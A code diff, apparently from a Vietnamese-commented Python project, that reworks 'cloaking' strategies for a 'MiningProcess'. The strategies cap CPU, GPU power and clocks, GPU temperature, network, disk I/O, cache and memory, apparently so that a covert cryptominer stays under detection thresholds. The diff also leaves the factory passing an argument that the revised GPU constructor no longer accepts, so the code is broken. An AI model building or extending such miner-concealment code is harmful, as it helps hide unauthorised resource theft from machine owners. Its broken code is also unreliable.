@@ -10,8 +10,8 @@ from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
 
 from .utils import MiningProcess  # Import MiningProcess từ utils.py
-from .cgroup_manager import CgroupManager  # Import CgroupManager
-from .resource_control import ResourceControlFactory  # Import ResourceControlFactory
+from .cgroup_manager import CgroupManager  # Import CgroupManager từ cgroup_manager.py
+from .resource_control import ResourceControlFactory  # Import ResourceControlFactory từ resource_control.py
 
 
 class CloakStrategy(ABC):
@@ -26,11 +26,10 @@ class CloakStrategy(ABC):
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller 
+            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller
                                        (ví dụ: {'cpu': 'priority_cpu'}).
         """
         pass
-
 
 class CpuCloakStrategy(CloakStrategy):
     """
@@ -251,31 +250,27 @@ class CpuCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
-
 class GpuCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking GPU:
       - Giới hạn power limit của GPU.
       - Tùy chọn điều chỉnh xung nhịp GPU.
+      - Giới hạn nhiệt độ của GPU.
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
         logger: logging.Logger,
-        cgroup_manager: CgroupManager,
-        gpu_resource_manager: Any,  # Thay bằng loại cụ thể nếu có
-        gpu_initialized: bool
+        gpu_resource_manager: Any  # Thay bằng loại cụ thể nếu có
     ):
         """
-        Khởi tạo GpuCloakStrategy với cấu hình, logger, CgroupManager và GPUResourceManager.
+        Khởi tạo GpuCloakStrategy với cấu hình, logger và GPUResourceManager.
 
         Args:
             config (Dict[str, Any]): Cấu hình cho chiến lược cloaking GPU.
             logger (logging.Logger): Logger để ghi log.
-            cgroup_manager (CgroupManager): Instance của CgroupManager để thao tác với cgroup.
             gpu_resource_manager (Any): Instance của GPUResourceManager từ resource_control.py.
-            gpu_initialized (bool): Trạng thái khởi tạo GPU.
         """
         # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
         self.throttle_percentage = config.get('throttle_percentage', 20)
@@ -283,184 +278,118 @@ class GpuCloakStrategy(CloakStrategy):
             logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
             self.throttle_percentage = 20
 
-        # Lấy cấu hình usage_threshold với giá trị mặc định là 80%
-        self.usage_threshold = config.get('usage_threshold', 80)
-        if not isinstance(self.usage_threshold, (int, float)) or not (0 <= self.usage_threshold <= 100):
-            logger.warning("Giá trị usage_threshold không hợp lệ, mặc định 80%.")
-            self.usage_threshold = 80
+        # Lấy cấu hình sm_clock và mem_clock với các giá trị mặc định
+        self.target_sm_clock = config.get('sm_clock', 1300)   # MHz
+        self.target_mem_clock = config.get('mem_clock', 800) # MHz
 
-        # Lấy cấu hình target_sm_clock và target_mem_clock với các giá trị mặc định
-        self.target_sm_clock = config.get('target_sm_clock', 1200)   # MHz
-        self.target_mem_clock = config.get('target_mem_clock', 800) # MHz
+        # Lấy cấu hình temperature_threshold với giá trị mặc định là 80°C
+        self.temperature_threshold = config.get('temperature_threshold', 80)  # °C
+        if not isinstance(self.temperature_threshold, (int, float)) or self.temperature_threshold <= 0:
+            logger.warning("Giá trị temperature_threshold không hợp lệ, mặc định 80°C.")
+            self.temperature_threshold = 80
+
+        # Lấy cấu hình fan_speed_increase với giá trị mặc định là 20% (nếu hỗ trợ)
+        self.fan_speed_increase = config.get('fan_speed_increase', 20)  # %
+        if not isinstance(self.fan_speed_increase, (int, float)) or not (0 <= self.fan_speed_increase <= 100):
+            logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
+            self.fan_speed_increase = 20
 
         self.logger = logger
-        self.cgroup_manager = cgroup_manager
         self.gpu_resource_manager = gpu_resource_manager
-
-        self.gpu_initialized = gpu_initialized
-
-        if self.gpu_initialized:
-            self.logger.info("GPUResourceManager đã được khởi tạo thành công. Sẵn sàng áp dụng cloaking GPU.")
-        else:
-            self.logger.warning("GPUResourceManager chưa được khởi tạo. Các chức năng cloaking GPU sẽ bị vô hiệu hóa.")
 
     def apply(self, process: MiningProcess, cgroups: Dict[str, str]) -> None:
         """
-        Áp dụng chiến lược cloaking GPU cho tiến trình đã cho trong cgroup đã chỉ định.
+        Áp dụng chiến lược cloaking GPU cho tiến trình đã cho.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình.
             cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
         """
-        if not self.gpu_initialized:
-            self.logger.warning(
-                f"GPUResourceManager chưa được khởi tạo. Không thể áp dụng cloaking GPU cho tiến trình "
-                f"{process.name} (PID: {process.pid})."
-            )
-            return
-
         try:
             pid, process_name = self.get_process_info(process)
-            gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
+            gpu_index = self.assign_gpu(pid)
 
-            if gpu_count == 0:
-                self.logger.warning("Không tìm thấy GPU nào trên hệ thống.")
-                return
-
-            # Gán GPU dựa trên PID
-            gpu_index = self.assign_gpu(pid, gpu_count)
             if gpu_index == -1:
                 self.logger.warning(
                     f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid})."
                 )
                 return
 
-            handle = self.gpu_resource_manager.gpu_manager.get_handle(gpu_index)
-
-            # Lấy thông tin sử dụng GPU
-            utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
-            gpu_util = utilization.gpu  # %
-            mem_util = utilization.memory
-
-            self.logger.info(
-                f"Hiện tại GPU sử dụng cho tiến trình {process_name} (PID: {pid}), "
-                f"GPU index={gpu_index}: GPU={gpu_util}%, MEM={mem_util}%"
-            )
-
-            if gpu_util < self.usage_threshold:
-                self.logger.info(
-                    f"Sử dụng GPU {gpu_util}% thấp hơn ngưỡng {self.usage_threshold}%. Bỏ qua throttling GPU."
-                )
-                return
-
-            # Lấy power limit hiện tại và các giới hạn
-            current_power_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
-            min_limit_mw, max_limit_mw = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)
-
-            current_power_limit_w = current_power_limit_mw / 1000
-            min_w = min_limit_mw / 1000
-            max_w = max_limit_mw / 1000
-
-            # Tính power limit mới dựa trên throttle_percentage
-            desired_power_limit_w = current_power_limit_w * (1 - self.throttle_percentage / 100)
-            desired_power_limit_w = max(min_w, min(desired_power_limit_w, max_w))
-            desired_power_limit_w = int(round(desired_power_limit_w))
-
-            # Thiết lập power limit mới thông qua GPUResourceManager
+            # Thực hiện các hành động cloaking bằng GPUResourceManager
+            # Thiết lập power limit
+            desired_power_limit_w = self.calculate_desired_power_limit(gpu_index)
             success = self.gpu_resource_manager.set_gpu_power_limit(gpu_index, desired_power_limit_w)
             if success:
                 self.logger.info(
-                    f"Đặt power limit GPU là {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
+                    f"Đặt power limit GPU {gpu_index} thành công lên {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid})."
                 )
             else:
                 self.logger.error(
-                    f"Không thể đặt power limit GPU cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
+                    f"Không thể đặt power limit GPU {gpu_index} cho tiến trình {process_name} (PID: {pid})."
                 )
 
-            # Tùy chọn: Đặt xung nhịp GPU (SM và Memory) thông qua GPUResourceManager
-            try:
-                self.gpu_resource_manager.set_gpu_clocks(gpu_index, self.target_sm_clock, self.target_mem_clock)
+            # Thiết lập xung nhịp GPU
+            success = self.gpu_resource_manager.set_gpu_clocks(gpu_index, self.target_sm_clock, self.target_mem_clock)
+            if success:
                 self.logger.info(
-                    f"Đặt xung nhịp GPU: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz "
-                    f"cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
+                    f"Đặt xung nhịp GPU {gpu_index}: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz cho tiến trình {process_name} (PID: {pid})."
                 )
-            except pynvml.NVMLError as e:
-                self.logger.warning(
-                    f"Không thể đặt xung nhịp GPU cho GPU {gpu_index} trên tiến trình {process_name} (PID: {pid}): {e}"
-                )
-
-            # Gán tiến trình vào cgroup GPU
-            gpu_cgroup = cgroups.get('gpu')
-            if gpu_cgroup:
-                try:
-                    # Tạo cgroup GPU nếu chưa tồn tại
-                    if not self.cgroup_manager.cgroup_exists(gpu_cgroup):
-                        created = self.cgroup_manager.create_cgroup(gpu_cgroup)
-                        if not created:
-                            self.logger.error(f"Không thể tạo cgroup GPU '{gpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-                            return
-
-                        # Thêm cgroup GPU vào cgroup cha 'root_gpu'
-                        parent_cgroup = "root_gpu"
-                        success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, gpu_cgroup)
-                        if not success:
-                            self.logger.error(f"Không thể thêm cgroup GPU '{gpu_cgroup}' vào cgroup cha '{parent_cgroup}'.")
-                            return
-
-                    # Thiết lập các tham số GPU thông qua GPUResourceManager
-                    success = self.gpu_resource_manager.set_gpu_max(gpu_cgroup, desired_power_limit_w * 1000)  # Convert W to mW
-                    if success:
-                        self.logger.info(
-                            f"Đặt 'gpu.max' là {desired_power_limit_w * 1000} mW cho cgroup GPU '{gpu_cgroup}'."
-                        )
-                    else:
-                        self.logger.error(
-                            f"Không thể đặt 'gpu.max' cho cgroup GPU '{gpu_cgroup}'."
-                        )
-
-                    # Gán tiến trình vào cgroup GPU
-                    success = self.cgroup_manager.assign_process_to_cgroup(pid, gpu_cgroup)
-                    if success:
-                        self.logger.info(f"Gán tiến trình PID={pid} vào cgroup '{gpu_cgroup}' cho GPU.")
-                    else:
-                        self.logger.error(f"Không thể gán tiến trình PID={pid} vào cgroup '{gpu_cgroup}' cho GPU.")
-
-                except psutil.NoSuchProcess as e:
-                    self.logger.error(f"Tiến trình PID={pid} không tồn tại khi thao tác với cgroup GPU: {e}")
-                except psutil.AccessDenied as e:
-                    self.logger.error(f"Không đủ quyền để thao tác với cgroup GPU cho PID {pid}: {e}")
-                except Exception as e:
-                    self.logger.error(
-                        f"Lỗi khi thao tác với cgroup GPU '{gpu_cgroup}' cho tiến trình {process_name} (PID: {pid}): {e}"
-                    )
-                    raise
             else:
-                self.logger.warning(f"Không có cgroup GPU được cung cấp cho tiến trình {process_name} (PID: {pid}).")
+                self.logger.warning(
+                    f"Không thể đặt xung nhịp GPU {gpu_index} cho tiến trình {process_name} (PID: {pid})."
+                )
 
-        except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi NVIDIA Management Library khi áp dụng cloaking GPU: {e}")
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để áp dụng cloaking GPU cho PID {process.pid}: {e}")
+            # Giới hạn nhiệt độ GPU
+            success = self.gpu_resource_manager.limit_temperature(
+                gpu_index,
+                self.temperature_threshold,
+                self.fan_speed_increase
+            )
+            if success:
+                self.logger.info(
+                    f"Giới hạn nhiệt độ GPU {gpu_index} thành công cho tiến trình {process_name} (PID: {pid})."
+                )
+            else:
+                self.logger.warning(
+                    f"Không thể giới hạn nhiệt độ GPU {gpu_index} cho tiến trình {process_name} (PID: {pid})."
+                )
+
         except Exception as e:
             self.logger.error(
                 f"Lỗi khi áp dụng cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
-    def assign_gpu(self, pid: int, gpu_count: int) -> int:
+    def calculate_desired_power_limit(self, gpu_index: int) -> int:
+        """
+        Tính toán power limit mới dựa trên throttle_percentage.
+
+        Args:
+            gpu_index (int): Chỉ số GPU.
+
+        Returns:
+            int: Power limit mới tính bằng Watts.
+        """
+        power_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
+        if power_limit is None:
+            self.logger.warning(f"Không thể lấy power limit hiện tại cho GPU {gpu_index}. Sử dụng giá trị mặc định.")
+            power_limit = 100  # Giá trị mặc định nếu không thể lấy
+
+        desired_power_limit_w = int(round(power_limit * (1 - self.throttle_percentage / 100)))
+        self.logger.debug(f"Tính toán power limit mới cho GPU {gpu_index}: {desired_power_limit_w}W")
+        return desired_power_limit_w
+
+    def assign_gpu(self, pid: int) -> int:
         """
         Gán GPU cho tiến trình dựa trên PID.
 
         Args:
             pid (int): PID của tiến trình.
-            gpu_count (int): Số lượng GPU có sẵn.
 
         Returns:
             int: Chỉ số GPU được gán hoặc -1 nếu không thể gán.
         """
-        # Ví dụ: gán GPU theo modulo PID với số lượng GPU
+        gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
         if gpu_count <= 0:
             return -1
         return pid % gpu_count
@@ -476,7 +405,6 @@ class GpuCloakStrategy(CloakStrategy):
             Tuple[int, str]: PID và tên tiến trình.
         """
         return process.pid, process.name
-
 
 class NetworkCloakStrategy(CloakStrategy):
     """
@@ -649,7 +577,6 @@ class NetworkCloakStrategy(CloakStrategy):
             self.logger.error(f"Lỗi khi xác định giao diện mạng chính: {e}")
             return None
 
-
 class DiskIoCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking Disk I/O:
@@ -758,7 +685,6 @@ class DiskIoCloakStrategy(CloakStrategy):
         """
         return process.pid, process.name
 
-
 class CacheCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking Cache:
@@ -856,15 +782,15 @@ class CacheCloakStrategy(CloakStrategy):
                 f"drop_caches=True, cache_limit_percent={self.cache_limit_percent}%."
             )
 
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để áp dụng cloaking Cache cho PID {process.pid}: {e}")
         except PermissionError as e:
             self.logger.error(
                 f"Không đủ quyền để drop caches. Cloaking Cache thất bại cho tiến trình {process.name} (PID: {process.pid})."
             )
             raise
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"Không đủ quyền để áp dụng cloaking Cache cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
                 f"Lỗi bất ngờ khi áp dụng cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
@@ -903,7 +829,6 @@ class CacheCloakStrategy(CloakStrategy):
             Tuple[int, str]: PID và tên tiến trình.
         """
         return process.pid, process.name
-
 
 class MemoryCloakStrategy(CloakStrategy):
     """
@@ -1018,18 +943,6 @@ class MemoryCloakStrategy(CloakStrategy):
             )
             raise
 
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        """
-        Lấy PID và tên tiến trình từ đối tượng process.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-
-        Returns:
-            Tuple[int, str]: PID và tên tiến trình.
-        """
-        return process.pid, process.name
-
     def calculate_memory_limit(self) -> int:
         """
         Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.
@@ -1041,6 +954,17 @@ class MemoryCloakStrategy(CloakStrategy):
         memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
         return memory_limit_bytes
 
+    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
+        """
+        Lấy PID và tên tiến trình từ đối tượng process.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+
+        Returns:
+            Tuple[int, str]: PID và tên tiến trình.
+        """
+        return process.pid, process.name
 
 class CloakStrategyFactory:
     """
@@ -1088,7 +1012,7 @@ class CloakStrategyFactory:
                     return strategy_class(
                         config,
                         logger,
-                        cgroup_manager,
+                        # cgroup_manager,  # <-- Đã loại bỏ sự phụ thuộc vào cgroup_manager
                         gpu_resource_manager,
                         gpu_initialized
                     )
